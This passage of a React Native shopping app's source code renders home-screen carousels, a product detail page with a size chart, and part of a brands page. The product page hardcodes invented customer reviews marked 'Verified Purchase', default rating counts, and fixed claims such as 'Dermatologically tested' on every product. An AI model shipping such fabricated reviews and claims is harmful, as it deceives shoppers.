              style={styles.essentialCard}
              onPress={() => handleEssentialPress(item)}
              activeOpacity={0.9}
            >
              <Image 
                source={{ uri: convertToSupportedImageFormat(item.images?.[0]?.src) }} 
                style={styles.essentialImage}
                onError={(e) => {
                  e.currentTarget.src = 'https://via.placeholder.com/160?text=Product';
                }}
              />
              {discount > 0 && (
                <View style={styles.essentialDiscountBadge}>
                  <Text style={styles.essentialDiscountText}>{discount}% OFF</Text>
                </View>
              )}
              <View style={styles.essentialInfo}>
                <Text style={styles.essentialName} numberOfLines={2}>{item.name}</Text>
                <View style={styles.essentialPriceRow}>
                  <Text style={styles.essentialCurrentPrice}>₹{parseFloat(item.price).toFixed(0)}</Text>
                  {item.regular_price && item.regular_price !== item.price && (
                    <Text style={styles.essentialOldPrice}>₹{parseFloat(item.regular_price).toFixed(0)}</Text>
                  )}
                </View>
                <TouchableOpacity 
                  style={styles.essentialAddBtn}
                  onPress={(e) => handleAddToCart(item, e)}
                >
                  <Text style={styles.essentialAddText}>Add to Cart</Text>
                </TouchableOpacity>
              </View>
            </TouchableOpacity>
          );
        })}
      </ScrollView>
    </View>
  );
};

  // Top Brands Carousel - White cards with brand names
  const TopBrandsCarousel = () => {
    const displayBrands = topBrands.slice(0, 5);

    if (displayBrands.length === 0) {
      return (
        <View style={styles.topBrandsSection}>
          <View style={styles.sectionHeader}>
            <Text style={styles.sectionTitle}>Top Brands</Text>
          </View>
          <View style={{ padding: 20, alignItems: 'center' }}>
            <Text style={{ color: '#999' }}>No brands available</Text>
          </View>
        </View>
      );
    }

    return (
      <View style={styles.topBrandsSection}>
        <View style={styles.sectionHeader}>
          <Text style={styles.sectionTitle}>Top Brands</Text>
        </View>
        <ScrollView 
          horizontal 
          showsHorizontalScrollIndicator={false}
          contentContainerStyle={{ paddingHorizontal: 15, gap: 12 }}
        >
          {displayBrands.map((brand) => (
            <TouchableOpacity
              key={brand.id}
              style={{
                width: 120,
                backgroundColor: '#FFFFFF',
                borderRadius: 12,
                paddingVertical: 20,
                paddingHorizontal: 12,
                alignItems: 'center',
                justifyContent: 'center',
                elevation: 3,
                shadowColor: '#000',
                shadowOffset: { width: 0, height: 2 },
                shadowOpacity: 0.1,
                shadowRadius: 4,
              }}
              onPress={() => navigation.navigate('Brands')}
              activeOpacity={0.8}
            >
              <Text style={{
                fontSize: 14,
                fontWeight: '600',
                color: '#000000',
                textAlign: 'center',
              }} numberOfLines={2}>
                {brand.name}
              </Text>
            </TouchableOpacity>
          ))}
        </ScrollView>
      </View>
    );
  };

  // Top Categories Carousel - White cards with category names
  const TopCategoriesCarousel = () => {
    const displayCategories = topCategories.slice(0, 5);

    if (displayCategories.length === 0) {
      return (
        <View style={styles.topCategoriesSection}>
          <View style={styles.sectionHeader}>
            <Text style={styles.sectionTitle}>Top Categories</Text>
          </View>
          <View style={{ padding: 20, alignItems: 'center' }}>
            <Text style={{ color: '#999' }}>No categories available</Text>
          </View>
        </View>
      );
    }

    return (
      <View style={styles.topCategoriesSection}>
        <View style={styles.sectionHeader}>
          <Text style={styles.sectionTitle}>Top Categories</Text>
        </View>
        <ScrollView 
          horizontal 
          showsHorizontalScrollIndicator={false}
          contentContainerStyle={{ paddingHorizontal: 15, gap: 12 }}
        >
          {displayCategories.map((category) => (
            <TouchableOpacity
              key={category.id}
              style={{
                width: 120,
                backgroundColor: '#FFFFFF',
                borderRadius: 12,
                paddingVertical: 20,
                paddingHorizontal: 12,
                alignItems: 'center',
                justifyContent: 'center',
                elevation: 3,
                shadowColor: '#000',
                shadowOffset: { width: 0, height: 2 },
                shadowOpacity: 0.1,
                shadowRadius: 4,
              }}
              onPress={() => navigation.navigate('Categories')}
              activeOpacity={0.8}
            >
              <Text style={{
                fontSize: 14,
                fontWeight: '600',
                color: '#000000',
                textAlign: 'center',
              }} numberOfLines={2}>
                {category.name}
              </Text>
            </TouchableOpacity>
          ))}
        </ScrollView>
      </View>
    );
  };

  if (loading) {
    return (
      <View style={styles.loadingContainer}>
        <ActivityIndicator size="large" color="#6200ee" />
        <Text style={styles.loadingText}>Loading amazing products...</Text>
      </View>
    );
  }

  return (
    <SafeAreaView style={styles.container}>
      <Header 
  navigation={navigation}
  cartCount={cartCount}
  wishlistCount={wishlistCount}
  searchQuery={searchQuery}
  setSearchQuery={setSearchQuery}
  selectedCategory={selectedCategory}
  setSelectedCategory={setSelectedCategory}
  categories={categories}
  scrollY={scrollY}  // ← ADD THIS LINE
/>
      
      <ScrollView
        showsVerticalScrollIndicator={false}
        refreshControl={<RefreshControl refreshing={refreshing} onRefresh={onRefresh} colors={['#6200ee']} />}
        contentContainerStyle={styles.scrollContent}
        onScroll={Animated.event(
          [{ nativeEvent: { contentOffset: { y: scrollY } } }],
          { useNativeDriver: false }
        )}
        scrollEventThrottle={16}
      >
        {/* Hero Image */}
        <Image 
          source={{ uri: 'https://i.ibb.co/B2GR2s43/Gemini-Generated-Image-ojosslojosslojos.png' }} 
          style={styles.heroImage}
        />
        
        <ImagesCarousel />
        
        <EssentialsSection />
        
        <PriceFilterCards products={products} />
        
        <TopBrandsCarousel />
        
        <TopCategoriesCarousel />
        
        <CategoryCarousel navigation={navigation} />
        
        <GridSection navigation={navigation} />
        
        <View style={{ height: 80 }} />
      </ScrollView>
    </SafeAreaView>
  );
};
// ========== PRODUCT DETAIL SCREEN (COMPLETELY FIXED) ==========
const ProductDetailScreen = ({ route, navigation }) => {
  const { product: initialProduct } = route.params;
  const [product, setProduct] = useState(initialProduct);
  const [quantity, setQuantity] = useState(1);
  const [selectedImage, setSelectedImage] = useState(0);
  const [isAddingToCart, setIsAddingToCart] = useState(false);
  const [activeTab, setActiveTab] = useState('description');
  const [showFullDescription, setShowFullDescription] = useState(false);
  const [sizeSelected, setSizeSelected] = useState(null);
  const [showSizeChart, setShowSizeChart] = useState(false);
  const { addToCart } = useContext(CartContext);
  const { addToWishlist, removeFromWishlist, isInWishlist } = useContext(WishlistContext);
  const { getItemCount } = useContext(CartContext);
  
  const cartCount = getItemCount();
  const scrollY = useRef(new Animated.Value(0)).current;
  const fadeAnim = useRef(new Animated.Value(0)).current;
  const slideAnim = useRef(new Animated.Value(30)).current;

  useEffect(() => {
    Animated.parallel([
      Animated.timing(fadeAnim, { toValue: 1, duration: 500, useNativeDriver: true }),
      Animated.timing(slideAnim, { toValue: 0, duration: 500, useNativeDriver: true })
    ]).start();
  }, []);

  const headerOpacity = scrollY.interpolate({
    inputRange: [0, 100, 200],
    outputRange: [0, 0.96, 1],
    extrapolate: 'clamp',
  });

  const updateQuantity = (delta) => {
    const newQty = quantity + delta;
    if (newQty >= 1 && newQty <= 99) setQuantity(newQty);
  };

  const shouldShowSizeChart = () => {
    if (!product) return false;
    
    if (product.categories && product.categories.length > 0) {
      const hasBraCategory = product.categories.some(cat => cat.id === 360);
      if (hasBraCategory) return true;
    }
    
    const productName = product.name?.toLowerCase() || '';
    if (productName.includes('bra')) return true;
    
    return false;
  };

  const innerwearSizes = ['XS', 'S', 'M', 'L', 'XL', 'XXL', '3XL'];
  const regularSizes = ['S', 'M', 'L', 'XL', 'XXL'];
  const sizes = shouldShowSizeChart() ? innerwearSizes : regularSizes;

  const handleAddToCart = async () => {
    setIsAddingToCart(true);
    await addToCart({ ...product, quantity });
    Vibration.vibrate(50);
    setTimeout(() => {
      Alert.alert('Added to Cart', `${quantity} × ${product.name} added to your cart`);
      setIsAddingToCart(false);
    }, 500);
  };

  const handleBuyNow = () => {
    addToCart({ ...product, quantity });
    navigation.navigate('Checkout');
  };

  const formatPrice = (price) => {
    return new Intl.NumberFormat('en-IN', { style: 'currency', currency: 'INR', minimumFractionDigits: 0, maximumFractionDigits: 0 }).format(price);
  };

  const getDiscountPercentage = () => {
    if (product.regular_price && product.regular_price !== product.price) {
      const discount = ((product.regular_price - product.price) / product.regular_price) * 100;
      return Math.round(discount);
    }
    return 0;
  };

  const discountPercentage = getDiscountPercentage();
  const isWeb = Platform.OS === 'web';

  const SizeChartModal = () => (
    <View style={{
      position: 'absolute',
      top: 0,
      left: 0,
      right: 0,
      bottom: 0,
      backgroundColor: 'rgba(0,0,0,0.5)',
      justifyContent: 'center',
      alignItems: 'center',
      zIndex: 1000,
    }}>
      <View style={{
        backgroundColor: '#fff',
        borderRadius: 20,
        width: width - 40,
        maxHeight: height * 0.8,
        padding: 20,
      }}>
        <View style={{ flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginBottom: 20 }}>
          <Text style={{ fontSize: 20, fontWeight: 'bold', color: '#1E90FF' }}>Size Chart</Text>
          <TouchableOpacity onPress={() => setShowSizeChart(false)}>
            <Ionicons name="close" size={24} color="#333" />
          </TouchableOpacity>
        </View>
        
        <ScrollView showsVerticalScrollIndicator={false}>
          <Text style={{ fontSize: 16, fontWeight: '600', color: '#333', marginBottom: 10 }}>
            Women Innerwear Size Guide
          </Text>
          
          <View style={{ backgroundColor: '#f5f5f5', borderRadius: 12, overflow: 'hidden', marginBottom: 15 }}>
            <View style={{ flexDirection: 'row', backgroundColor: '#1E90FF', padding: 10 }}>
              <Text style={{ flex: 1, color: '#fff', fontWeight: 'bold', textAlign: 'center' }}>Size</Text>
              <Text style={{ flex: 1, color: '#fff', fontWeight: 'bold', textAlign: 'center' }}>Bust (inches)</Text>
              <Text style={{ flex: 1, color: '#fff', fontWeight: 'bold', textAlign: 'center' }}>Waist (inches)</Text>
              <Text style={{ flex: 1, color: '#fff', fontWeight: 'bold', textAlign: 'center' }}>Hip (inches)</Text>
            </View>
            {[
              { size: 'XS', bust: '30-32', waist: '24-26', hip: '32-34' },
              { size: 'S', bust: '32-34', waist: '26-28', hip: '34-36' },
              { size: 'M', bust: '34-36', waist: '28-30', hip: '36-38' },
              { size: 'L', bust: '36-38', waist: '30-32', hip: '38-40' },
              { size: 'XL', bust: '38-40', waist: '32-34', hip: '40-42' },
              { size: 'XXL', bust: '40-42', waist: '34-36', hip: '42-44' },
              { size: '3XL', bust: '42-44', waist: '36-38', hip: '44-46' },
            ].map((item, idx) => (
              <View key={idx} style={{ flexDirection: 'row', padding: 10, borderBottomWidth: idx < 6 ? 1 : 0, borderBottomColor: '#e0e0e0' }}>
                <Text style={{ flex: 1, textAlign: 'center', fontWeight: '600', color: '#333' }}>{item.size}</Text>
                <Text style={{ flex: 1, textAlign: 'center', color: '#666' }}>{item.bust}</Text>
                <Text style={{ flex: 1, textAlign: 'center', color: '#666' }}>{item.waist}</Text>
                <Text style={{ flex: 1, textAlign: 'center', color: '#666' }}>{item.hip}</Text>
              </View>
            ))}
          </View>
          
          <Text style={{ fontSize: 14, color: '#666', marginBottom: 10 }}>
            💡 <Text style={{ fontWeight: 'bold' }}>How to measure:</Text>
          </Text>
          <Text style={{ fontSize: 12, color: '#666', marginBottom: 5, lineHeight: 18 }}>
            • <Text style={{ fontWeight: '500' }}>Bust:</Text> Measure around the fullest part of your bust
          </Text>
          <Text style={{ fontSize: 12, color: '#666', marginBottom: 5, lineHeight: 18 }}>
            • <Text style={{ fontWeight: '500' }}>Waist:</Text> Measure around the narrowest part of your waist
          </Text>
          <Text style={{ fontSize: 12, color: '#666', marginBottom: 15, lineHeight: 18 }}>
            • <Text style={{ fontWeight: '500' }}>Hip:</Text> Measure around the fullest part of your hips
          </Text>
          
          <TouchableOpacity 
            onPress={() => setShowSizeChart(false)}
            style={{ backgroundColor: '#1E90FF', padding: 12, borderRadius: 10, alignItems: 'center', marginTop: 10 }}
          >
            <Text style={{ color: '#fff', fontWeight: 'bold' }}>Close</Text>
          </TouchableOpacity>
        </ScrollView>
      </View>
    </View>
  );

  const relatedProducts = [
    { 
      id: 101, 
      name: 'Vitamin C Brightening Serum', 
      price: 599, 
      originalPrice: 999, 
      rating: 4.5, 
      image: 'https://images.pexels.com/photos/4041392/pexels-photo-4041392.jpeg?w=200',
      description: 'Brightening serum with Vitamin C for glowing skin.',
      stock_status: 'instock',
      categories: [{ id: 1, name: 'Skincare' }]
    },
    { 
      id: 102, 
      name: 'Hyaluronic Acid Booster', 
      price: 799, 
      originalPrice: 1299, 
      rating: 4.8, 
      image: 'https://images.pexels.com/photos/4041391/pexels-photo-4041391.jpeg?w=200',
      description: 'Deep hydration with hyaluronic acid.',
      stock_status: 'instock',
      categories: [{ id: 1, name: 'Skincare' }]
    },
    { 
      id: 103, 
      name: 'Niacinamide Serum 10%', 
      price: 499, 
      originalPrice: 899, 
      rating: 4.3, 
      image: 'https://images.pexels.com/photos/3738347/pexels-photo-3738347.jpeg?w=200',
      description: 'Niacinamide serum for pore reduction.',
      stock_status: 'instock',
      categories: [{ id: 1, name: 'Skincare' }]
    },
    { 
      id: 104, 
      name: 'Retinol Anti-Aging Cream', 
      price: 899, 
      originalPrice: 1499, 
      rating: 4.6, 
      image: 'https://images.pexels.com/photos/4041396/pexels-photo-4041396.jpeg?w=200',
      description: 'Anti-aging cream with retinol.',
      stock_status: 'instock',
      categories: [{ id: 1, name: 'Skincare' }]
    },
  ];

  const handleRelatedProductPress = (relatedProduct) => {
    navigation.navigate('ProductDetail', { 
      product: { 
        id: relatedProduct.id,
        name: relatedProduct.name, 
        price: relatedProduct.price, 
        regular_price: relatedProduct.originalPrice,
        images: [{ src: relatedProduct.image }],
        average_rating: relatedProduct.rating,
        description: relatedProduct.description,
        stock_status: relatedProduct.stock_status,
        categories: relatedProduct.categories
      } 
    });
  };

  const reviews = [
    { id: 1, name: "Priya Sharma", rating: 5, verified: true, title: "Absolutely love this product!", comment: "This is my third purchase. Works wonderfully and gives amazing results.", date: "2 days ago", helpful: 45 },
    { id: 2, name: "Rahul Mehta", rating: 4, verified: true, title: "Good value for money", comment: "Quality product at reasonable price. Delivery was quick.", date: "5 days ago", helpful: 23 },
    { id: 3, name: "Anita Desai", rating: 5, verified: false, title: "Best purchase ever!", comment: "My skin feels so soft and glowing after using this.", date: "1 week ago", helpful: 67 },
    { id: 4, name: "Vikram Singh", rating: 4, verified: true, title: "Nice product", comment: "Good quality. Met my expectations. Fast shipping.", date: "2 weeks ago", helpful: 12 },
  ];

  const ProductContent = () => (
    <Animated.View style={{ opacity: fadeAnim, transform: [{ translateY: slideAnim }] }}>
      {/* Image Gallery */}
      <View style={styles.amazonImageGallery}>
        <View style={styles.amazonMainImageContainer}>
          <ScrollView 
            horizontal 
            pagingEnabled 
            showsHorizontalScrollIndicator={false}
            onMomentumScrollEnd={(e) => {
              const newIndex = Math.round(e.nativeEvent.contentOffset.x / width);
              setSelectedImage(newIndex);
            }}
          >
            {(product.images?.length ? product.images : [{ src: 'https://via.placeholder.com/500?text=Product+Image' }]).map((img, idx) => (
              <Image 
                key={idx} 
                source={{ uri: img.src }} 
                style={styles.amazonMainImage}
                onError={(e) => {
                  console.log('Image failed to load:', img.src);
                  e.currentTarget.src = 'https://via.placeholder.com/500?text=Image+Not+Found';
                }}
                onLoad={() => console.log('Image loaded:', img.src)}
              />
            ))}
          </ScrollView>
          
          {discountPercentage > 0 && (
            <View style={styles.amazonDiscountBadge}>
              <Text style={styles.amazonDiscountText}>{discountPercentage}% OFF</Text>
            </View>
          )}
          
          <TouchableOpacity 
            style={styles.amazonWishlistBtn}
            onPress={() => isInWishlist(product.id) ? removeFromWishlist(product.id) : addToWishlist(product)}
          >
            <Ionicons name={isInWishlist(product.id) ? 'heart' : 'heart-outline'} size={24} color={isInWishlist(product.id) ? '#ff4444' : '#333'} />
          </TouchableOpacity>
        </View>
        
        {product.images?.length > 1 && (
          <ScrollView horizontal showsHorizontalScrollIndicator={false} style={styles.amazonThumbStrip} contentContainerStyle={styles.amazonThumbContent}>
            {product.images.map((img, idx) => (
              <TouchableOpacity key={idx} onPress={() => setSelectedImage(idx)}>
                <Image 
                  source={{ uri: img.src }} 
                  style={[styles.amazonThumbImage, selectedImage === idx && styles.amazonThumbActive]}
                  onError={(e) => {
                    e.currentTarget.src = 'https://via.placeholder.com/60?text=No';
                  }}
                />
              </TouchableOpacity>
            ))}
          </ScrollView>
        )}
      </View>

      <View style={styles.amazonInfoContainer}>
        <Text style={styles.amazonTitle}>{product.name}</Text>

        <View style={styles.amazonRatingSection}>
          <View style={styles.amazonStars}>
            {[1, 2, 3, 4, 5].map(star => (
              <Ionicons key={star} name={star <= Math.floor(product.average_rating || 4.5) ? 'star' : 'star-outline'} size={16} color="#FFA41C" />
            ))}
          </View>
          <Text style={styles.amazonRatingCount}>{product.rating_count || 128} ratings</Text>
          <Text style={styles.amazonReviewLink} onPress={() => setActiveTab('reviews')}>See all reviews</Text>
        </View>

        <View style={styles.amazonPriceSection}>
          <View style={styles.amazonPriceRow}>
            <Text style={styles.amazonPriceLabel}>Price:</Text>
            <Text style={styles.amazonPrice}>{formatPrice(product.price)}</Text>
            {product.regular_price && product.regular_price !== product.price && (
              <Text style={styles.amazonOriginalPrice}>{formatPrice(product.regular_price)}</Text>
            )}
          </View>
          {discountPercentage > 0 && (
            <View style={styles.amazonSaveRow}>
              <Text style={styles.amazonSaveLabel}>You Save:</Text>
              <Text style={styles.amazonSaveAmount}>{formatPrice(product.regular_price - product.price)} ({discountPercentage}%)</Text>
            </View>
          )}
          <Text style={styles.amazonTaxInfo}>Inclusive of all taxes</Text>
          <Text style={styles.amazonEMI}>No cost EMI available on select cards</Text>
        </View>

        <View style={styles.amazonOffersSection}>
          <Text style={styles.amazonOffersTitle}>Special offers:</Text>
          <View style={styles.amazonOfferItem}>
            <Ionicons name="checkmark-circle" size={18} color="#008a00" />
            <Text style={styles.amazonOfferText}>Bank Offer: 10% off on SBI Credit Cards</Text>
          </View>
          <View style={styles.amazonOfferItem}>
            <Ionicons name="checkmark-circle" size={18} color="#008a00" />
            <Text style={styles.amazonOfferText}>Combo Offer: Buy 2 or more get extra 5% off</Text>
          </View>
          <View style={styles.amazonOfferItem}>
            <Ionicons name="checkmark-circle" size={18} color="#008a00" />
            <Text style={styles.amazonOfferText}>Free Shipping on orders above ₹999</Text>
          </View>
        </View>

        {shouldShowSizeChart() && (
          <View style={styles.amazonSizeSection}>
            <View style={styles.amazonSectionHeader}>
              <Text style={styles.amazonSectionTitle}>Select Size</Text>
              <TouchableOpacity onPress={() => setShowSizeChart(true)}>
                <Text style={styles.amazonSizeGuide}>📏 Size Guide</Text>
              </TouchableOpacity>
            </View>
            <View style={styles.amazonSizeGrid}>
              {sizes.map((size) => (
                <TouchableOpacity
                  key={size}
                  style={[styles.amazonSizeBtn, sizeSelected === size && styles.amazonSizeBtnActive]}
                  onPress={() => setSizeSelected(size)}
                >
                  <Text style={[styles.amazonSizeText, sizeSelected === size && styles.amazonSizeTextActive]}>{size}</Text>
                </TouchableOpacity>
              ))}
            </View>
          </View>
        )}

        <View style={styles.amazonStockSection}>
          {product.stock_status === 'instock' ? (
            <>
              <View style={styles.amazonStockRow}>
                <Ionicons name="checkmark-circle" size={18} color="#008a00" />
                <Text style={styles.amazonStockText}>In Stock</Text>
              </View>
              <Text style={styles.amazonDeliveryText}>FREE delivery {new Date(Date.now() + 3*24*60*60*1000).toLocaleDateString('en-IN', { weekday: 'short', month: 'short', day: 'numeric' })}</Text>
            </>
          ) : (
            <View style={styles.amazonStockRow}>
              <Ionicons name="close-circle" size={18} color="#ff4444" />
              <Text style={styles.amazonOutOfStockText}>Out of Stock</Text>
            </View>
          )}
        </View>

        <View style={styles.amazonQuantitySection}>
          <Text style={styles.amazonQuantityLabel}>Quantity:</Text>
          <View style={styles.amazonQuantityControls}>
            <TouchableOpacity onPress={() => updateQuantity(-1)} style={[styles.amazonQtyBtn, quantity <= 1 && styles.amazonQtyBtnDisabled]} disabled={quantity <= 1}>
              <Text style={styles.amazonQtyBtnText}>−</Text>
            </TouchableOpacity>
            <Text style={styles.amazonQtyValue}>{quantity}</Text>
            <TouchableOpacity onPress={() => updateQuantity(1)} style={[styles.amazonQtyBtn, quantity >= 99 && styles.amazonQtyBtnDisabled]} disabled={quantity >= 99}>
              <Text style={styles.amazonQtyBtnText}>+</Text>
            </TouchableOpacity>
          </View>
        </View>

        <View style={styles.amazonActionButtons}>
          <TouchableOpacity style={styles.amazonAddToCartBtn} onPress={handleAddToCart} disabled={isAddingToCart}>
            {isAddingToCart ? (
              <ActivityIndicator size="small" color="#fff" />
            ) : (
              <>
                <Ionicons name="cart-outline" size={22} color="#fff" />
                <Text style={styles.amazonAddToCartText}>Add to Cart</Text>
              </>
            )}
          </TouchableOpacity>
          <TouchableOpacity style={styles.amazonBuyNowBtn} onPress={handleBuyNow}>
            <Text style={styles.amazonBuyNowText}>Buy Now</Text>
          </TouchableOpacity>
        </View>

        <View style={styles.amazonTabs}>
          {['description', 'details', 'reviews'].map((tab) => (
            <TouchableOpacity 
              key={tab} 
              style={[styles.amazonTab, activeTab === tab && styles.amazonTabActive]} 
              onPress={() => setActiveTab(tab)}
            >
              <Text style={[styles.amazonTabText, activeTab === tab && styles.amazonTabTextActive]}>
                {tab === 'description' ? 'Product Description' : tab === 'details' ? 'Product Details' : 'Customer Reviews'}
              </Text>
            </TouchableOpacity>
          ))}
        </View>

        <View style={styles.amazonTabContent}>
          {activeTab === 'description' && (
            <View>
              <Text style={styles.amazonDescription} numberOfLines={showFullDescription ? undefined : 4}>
                {product.description?.replace(/<[^>]*>/g, '') || 'No description available for this product.'}
              </Text>
              {product.description?.length > 200 && (
                <TouchableOpacity onPress={() => setShowFullDescription(!showFullDescription)}>
                  <Text style={styles.amazonReadMore}>{showFullDescription ? 'Read less' : 'Read more'}</Text>
                </TouchableOpacity>
              )}
              
              <View style={styles.amazonFeatures}>
                <Text style={styles.amazonFeaturesTitle}>Product Highlights:</Text>
                {['Dermatologically tested formula', 'Suitable for all skin types', 'Paraben & sulfate free', 'Cruelty-free product', 'Long-lasting effect', 'Premium quality ingredients'].map((feature, idx) => (
                  <View key={idx} style={styles.amazonFeatureItem}>
                    <Ionicons name="checkmark-circle" size={18} color="#008a00" />
                    <Text style={styles.amazonFeatureText}>{feature}</Text>
                  </View>
                ))}
              </View>
            </View>
          )}

          {activeTab === 'details' && (
            <View style={styles.amazonDetailsTable}>
              {[
                { label: 'Brand', value: product.brands?.[0]?.name || 'ACW Beauty' },
                { label: 'Skin Type', value: 'All Skin Types' },
                { label: 'Item Form', value: 'Cream / Serum' },
                { label: 'Shelf Life', value: '24 months' },
                { label: 'Country of Origin', value: 'India' },
              ].map((item, idx) => (
                <View key={idx} style={styles.amazonDetailsRow}>
                  <Text style={styles.amazonDetailsLabel}>{item.label}</Text>
                  <Text style={styles.amazonDetailsValue}>{item.value}</Text>
                </View>
              ))}
            </View>
          )}

          {activeTab === 'reviews' && (
            <View>
              <View style={styles.amazonRatingSummary}>
                <View style={styles.amazonRatingSummaryLeft}>
                  <Text style={styles.amazonAvgRating}>4.5</Text>
                  <View style={styles.amazonStarsLarge}>
                    {[1, 2, 3, 4].map(i => <Ionicons key={i} name="star" size={20} color="#FFA41C" />)}
                    <Ionicons name="star-half" size={20} color="#FFA41C" />
                  </View>
                  <Text style={styles.amazonTotalRatings}>128 global ratings</Text>
                </View>
                <TouchableOpacity style={styles.amazonWriteReviewBtn}>
                  <Text style={styles.amazonWriteReviewText}>Write a Review</Text>
                </TouchableOpacity>
              </View>

              {reviews.map((review) => (
                <View key={review.id} style={styles.amazonReviewCard}>
                  <View style={styles.amazonReviewHeader}>
                    <Text style={styles.amazonReviewerName}>{review.name}</Text>
                    {review.verified && (
                      <View style={styles.amazonVerifiedBadge}>
                        <Ionicons name="checkmark-circle" size={12} color="#008a00" />
                        <Text style={styles.amazonVerifiedText}>Verified Purchase</Text>
                      </View>
                    )}
                  </View>
                  <View style={styles.amazonReviewStars}>
                    {[1, 2, 3, 4, 5].map(star => (
                      <Ionicons key={star} name={star <= review.rating ? 'star' : 'star-outline'} size={14} color="#FFA41C" />
                    ))}
                    <Text style={styles.amazonReviewDate}>{review.date}</Text>
                  </View>
                  <Text style={styles.amazonReviewTitle}>{review.title}</Text>
                  <Text style={styles.amazonReviewComment}>{review.comment}</Text>
                  <TouchableOpacity style={styles.amazonHelpfulBtn}>
                    <Text style={styles.amazonHelpfulText}>Helpful ({review.helpful})</Text>
                  </TouchableOpacity>
                </View>
              ))}
            </View>
          )}
        </View>

        <View style={styles.amazonRelatedSection}>
          <Text style={styles.amazonRelatedTitle}>Customers who bought this also bought</Text>
          <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.amazonRelatedScroll}>
            {relatedProducts.map((item) => (
              <TouchableOpacity 
                key={item.id} 
                style={styles.amazonRelatedCard}
                onPress={() => handleRelatedProductPress(item)}
                activeOpacity={0.8}
              >
                <Image 
                  source={{ uri: item.image }} 
                  style={styles.amazonRelatedImage}
                  onError={(e) => {
                    e.currentTarget.src = 'https://via.placeholder.com/160?text=Product';
                  }}
                />
                <Text style={styles.amazonRelatedName} numberOfLines={2}>{item.name}</Text>
                <View style={{ flexDirection: 'row', alignItems: 'center', gap: 8, marginTop: 4 }}>
                  <Text style={styles.amazonRelatedPrice}>₹{item.price}</Text>
                  <Text style={{ fontSize: 11, color: '#999', textDecorationLine: 'line-through' }}>₹{item.originalPrice}</Text>
                </View>
                <View style={styles.amazonRelatedRating}>
                  <View style={styles.amazonStarsSmall}>
                    {[1, 2, 3, 4, 5].map(star => (
                      <Ionicons key={star} name={star <= item.rating ? 'star' : 'star-outline'} size={12} color="#FFA41C" />
                    ))}
                  </View>
                  <Text style={{ fontSize: 10, color: '#666', marginLeft: 4 }}>({item.rating})</Text>
                </View>
              </TouchableOpacity>
            ))}
          </ScrollView>
        </View>

        <View style={styles.amazonDeliverySection}>
          <View style={styles.amazonDeliveryRow}>
            <Ionicons name="cube-outline" size={24} color="#0066c0" />
            <View>
              <Text style={styles.amazonDeliveryTitle}>FREE Delivery</Text>
              <Text style={styles.amazonDeliveryDesc}>Get by {new Date(Date.now() + 3*24*60*60*1000).toLocaleDateString('en-IN', { weekday: 'short', month: 'short', day: 'numeric' })}</Text>
            </View>
          </View>
          <View style={styles.amazonDeliveryRow}>
            <Ionicons name="return-down-back-outline" size={24} color="#0066c0" />
            <View>
              <Text style={styles.amazonDeliveryTitle}>7 Days Returnable</Text>
              <Text style={styles.amazonDeliveryDesc}>Easy returns within 7 days of delivery</Text>
            </View>
          </View>
          <View style={styles.amazonDeliveryRow}>
            <Ionicons name="shield-checkmark-outline" size={24} color="#0066c0" />
            <View>
              <Text style={styles.amazonDeliveryTitle}>100% Authentic</Text>
              <Text style={styles.amazonDeliveryDesc}>Genuine products with manufacturer warranty</Text>
            </View>
          </View>
        </View>
      </View>
    </Animated.View>
  );

  if (isWeb) {
    return (
      <>
        <div style={stylesWeb.amazonContainer}>
          <div style={stylesWeb.amazonStickyHeader}>
            <div style={stylesWeb.amazonHeaderLeft}>
              <button onClick={() => navigation.goBack()} style={stylesWeb.amazonBackBtn}>
                ← Back
              </button>
            </div>
            <div style={stylesWeb.amazonHeaderCenter}>
              <Image source={{ uri: 'https://via.placeholder.com/100x30?text=LOGO' }} style={stylesWeb.amazonLogo} />
            </div>
            <div style={stylesWeb.amazonHeaderRight}>
              <button onClick={() => navigation.navigate('Cart')} style={stylesWeb.amazonCartBtn}>
                🛒 Cart ({cartCount})
              </button>
            </div>
          </div>
          <div style={stylesWeb.amazonScrollContent}>
            <ProductContent />
          </div>
        </div>
        {showSizeChart && <SizeChartModal />}
      </>
    );
  }

  return (
    <>
      <View style={styles.amazonMobileContainer}>
        <Animated.View style={[styles.amazonMobileHeader, { opacity: headerOpacity }]}>
          <TouchableOpacity onPress={() => navigation.goBack()} style={styles.amazonMobileBackBtn}>
            <Ionicons name="chevron-back" size={28} color="#1a1a1a" />
          </TouchableOpacity>
          
          <Animated.Text style={[styles.amazonMobileHeaderTitle, { opacity: headerOpacity }]} numberOfLines={1}>
            {product.name}
          </Animated.Text>
        </Animated.View>

        <ScrollView
          showsVerticalScrollIndicator={false}
          scrollEventThrottle={16}
          onScroll={Animated.event([{ nativeEvent: { contentOffset: { y: scrollY } } }], { useNativeDriver: false })}
          style={styles.amazonMobileScroll}
          contentContainerStyle={{ paddingBottom: 40 }}
        >
          <ProductContent />
        </ScrollView>
      </View>
      {showSizeChart && <SizeChartModal />}
    </>
  );
};
// ========== BRANDS PAGE (UPDATED) ==========
// ========== BRANDS PAGE (REDESIGNED LIKE CATEGORY PAGE) ==========
// ========== BRANDS PAGE (OPTIMIZED - LIKE CATEGORY PAGE) ==========
const BrandsPage = ({ navigation }) => {
  const [brands, setBrands] = useState([]);
  const [filteredBrands, setFilteredBrands] = useState([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [loading, setLoading] = useState(true);
  const [showSearch, setShowSearch] = useState(false);
  const [selectedBrand, setSelectedBrand] = useState(null);
  const [brandProducts, setBrandProducts] = useState([]);
  const [showProductsPage, setShowProductsPage] = useState(false);
  const [loadingBrandProducts, setLoadingBrandProducts] = useState(false);
  const [allProductsCache, setAllProductsCache] = useState([]);
  const searchInputRef = useRef(null);
  const scrollY = useRef(new Animated.Value(0)).current;
useEffect(() => {
  loadAllProductsForBrands();
}, []);

const loadAllProductsForBrands = async () => {
  // Try to get cached all products first
  try {
    const cachedAll = await AsyncStorage.getItem('all_products');
    if (cachedAll) {
      const { data, timestamp } = JSON.parse(cachedAll);
      // Use cache if less than 10 minutes old
      if (Date.now() - timestamp < 10 * 60 * 1000) {
        console.log(`📦 Using cached products for brands: ${data.length} items`);
        setAllProductsCache(data);
        return;
      }
    }
  } catch (error) {
    console.log("Cache read error:", error);
  }
  
  // Fetch all products
  const allProducts = await fetchAllProducts();
  setAllProductsCache(allProducts);
};
  // Softer premium colors for brand cards (same as category page)
  const cardColors = [
    'rgba(139, 69, 19, 0.85)',    // SaddleBrown - soft
    'rgba(46, 139, 87, 0.85)',    // SeaGreen - soft
